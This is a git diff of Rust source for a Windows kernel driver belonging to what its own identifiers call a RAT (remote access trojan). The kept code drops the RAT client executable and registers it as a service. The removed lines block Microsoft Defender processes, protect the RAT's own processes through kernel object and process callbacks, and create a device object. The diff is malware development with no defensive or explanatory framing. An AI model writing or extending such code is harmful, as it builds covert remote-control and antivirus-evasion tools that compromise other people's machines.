@@ -1,18 +1,13 @@
 pub mod cleanup;
 
-use alloc::boxed::Box;
-use alloc::collections::BTreeSet;
 use alloc::{format, vec};
 use core::ffi::c_void;
-use core::sync::atomic::Ordering;
-use core::{mem, ptr, slice};
+use core::ptr;
 
-use aho_corasick::AhoCorasickBuilder;
 use const_format::formatcp;
 use rat_common::utils::DropGuard;
 use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
 use rat_common::windows::config::Config;
-use rat_common::windows::kernel::KernelHandoff;
 use rat_common::windows::utils::is_equal_guid;
 use wdk::nt_success;
 use wdk_sys::_MODE::KernelMode;
@@ -36,20 +31,15 @@ use windows_sys::Win32::System::Ioctl::{
 };
 
 use crate::global::{
-    MAX_INITIALIZE_ATTEMPTS, MS_DEFENDER_AHO_CORASICK, MS_DEFENDER_PROCESS_PATTERN,
-    OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT,
-    PROCESS_NOTIFY_ROUTINE, RAT_CLIENT, RAT_CLIENT_FILE_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
-    RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY, RAT_DEVICE_OBJECT, SELF_DEFENSE_PIDS,
+    MAX_INITIALIZE_ATTEMPTS, RAT_CLIENT, RAT_CLIENT_FILE_PATH, RAT_CLIENT_SERVICE_PATH,
+    RAT_CLIENT_SERVICE_REGISTRY,
 };
-use crate::handlers::{device, object, process};
 use crate::utils::windows_to_wdk_guid;
 use crate::wrappers::bindings::InitializeObjectAttributes;
-use crate::wrappers::lock::SpinLock;
 use crate::wrappers::{fs, registry};
 use crate::{error, info};
 
-pub unsafe extern "C" fn initialize_thread_routine(extra: *mut c_void) {
-    let extra = unsafe { Box::from_raw(extra.cast()) };
+pub unsafe extern "C" fn initialize_thread_routine(_: *mut c_void) {
     let mut sleep = LARGE_INTEGER { QuadPart: -3000000 }; // 300 ms
 
     for retry in 0..MAX_INITIALIZE_ATTEMPTS {
@@ -64,7 +54,7 @@ pub unsafe extern "C" fn initialize_thread_routine(extra: *mut c_void) {
             break;
         }
 
-        if initialize(&extra).is_ok() {
+        if initialize().is_ok() {
             return;
         }
     }
@@ -210,7 +200,7 @@ fn read_config() -> anyhow::Result<Config> {
                                 let file = fs::File::open(u16path.as_ptr())?;
 
                                 let mut content = vec![];
-                                let mut buffer = [0; 1024];
+                                let mut buffer = [0; 128];
                                 loop {
                                     let bytes = file.read(&mut buffer)?;
                                     if bytes == 0 {
@@ -232,6 +222,10 @@ fn read_config() -> anyhow::Result<Config> {
                 break;
             } else if status == STATUS_BUFFER_TOO_SMALL {
                 partitions_count = partitions_count.saturating_mul(2);
+                if partitions_count > 64 {
+                    break;
+                }
+
                 buffer.resize(_buffer_size(partitions_count), 0);
             } else {
                 anyhow::bail!("ZwDeviceIoControlFile error: 0x{status:X}");
@@ -322,17 +316,7 @@ fn drop_file() -> anyhow::Result<()> {
     Ok(())
 }
 
-/// Interpret as a `&[u8]` slice for aho-corasick
-fn u16cstr_to_buf(u16cstr: &U16CStr) -> &[u8] {
-    unsafe {
-        slice::from_raw_parts(
-            u16cstr.as_ptr().cast(),
-            u16cstr.len() * mem::size_of::<u16>(),
-        )
-    }
-}
-
-fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
+fn initialize() -> anyhow::Result<()> {
     // Drop client executable
     drop_file().inspect_err(|e| {
         error!("Failed to drop RAT client: {e}");
@@ -347,59 +331,6 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
     setup_service_registry(&config).inspect_err(|e| {
         error!("Failed to setup service registry: {e}");
     })?;
-
-    // Create Aho-Corasick automaton for MS Defender block
-    let ac = AhoCorasickBuilder::new()
-        .ascii_case_insensitive(true)
-        .build(
-            MS_DEFENDER_PROCESS_PATTERN
-                .iter()
-                .map(|p| u16cstr_to_buf(p)),
-        )
-        .map_err(|e| {
-            error!("Failed to build Aho-Corasick automaton for MS Defender block: {e}");
-            anyhow::anyhow!("Aho-Corasick build error: {e}")
-        })?;
-    cleanup::cleanup_aho_corasick(
-        MS_DEFENDER_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel),
-    );
-
-    // Create Aho-Corasick automaton for self-defense
-    let ac = AhoCorasickBuilder::new()
-        .ascii_case_insensitive(true)
-        .build([u16cstr_to_buf(RAT_CLIENT_OBJ_PATH_SELF_DEFENSE)])
-        .map_err(|e| {
-            error!("Failed to build Aho-Corasick automaton for object path: {e}");
-            anyhow::anyhow!("Aho-Corasick build error: {e}")
-        })?;
-    cleanup::cleanup_aho_corasick(
-        OBJ_PATH_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel),
-    );
-
-    // Register object callbacks for self-defense
-    let ob = object::ob_register_callbacks(extra).inspect_err(|e| {
-        error!("Failed to register object callbacks: {e}");
-    })?;
-    cleanup::cleanup_object_callbacks(OB_REGISTER_CALLBACKS_HANDLE.swap(ob, Ordering::AcqRel));
-
-    // Register process creation/deletion callback
-    let ps = process::ps_set_create_process_notify_routine_ex(extra).inspect_err(|e| {
-        error!("Failed to register process callbacks: {e}");
-    })?;
-    cleanup::cleanup_process_notify_routine(
-        PROCESS_NOTIFY_ROUTINE.swap(ps as *mut u8, Ordering::AcqRel),
-    );
-
-    // Construct data structure to track self-defense PIDs
-    let pids = Box::into_raw(Box::new(SpinLock::new(BTreeSet::new())));
-    cleanup::cleanup_self_defense_pids(SELF_DEFENSE_PIDS.swap(pids, Ordering::AcqRel));
-
-    // Create device object
-    let driver = ORIGINAL_DRIVER_OBJECT.load(Ordering::Acquire);
-    let device = device::create_device(driver).inspect_err(|e| {
-        error!("Failed to create device object: {e}");
-    })?;
-    cleanup::cleanup_device(RAT_DEVICE_OBJECT.swap(device, Ordering::AcqRel));
 
     Ok(())
 }
